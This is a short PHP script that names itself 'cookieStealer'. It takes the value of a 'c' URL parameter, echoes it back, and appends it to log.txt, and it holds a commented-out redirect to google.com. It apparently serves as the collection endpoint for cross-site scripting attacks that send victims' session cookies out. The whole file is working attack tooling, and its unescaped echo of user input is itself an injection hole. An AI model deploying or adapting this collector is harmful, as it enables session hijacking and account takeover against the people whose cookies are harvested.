<?php
//header ('Location:https://google.com');
echo 'this is cookieStealer';
$cookies = $_GET["c"];
echo $cookies;
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>
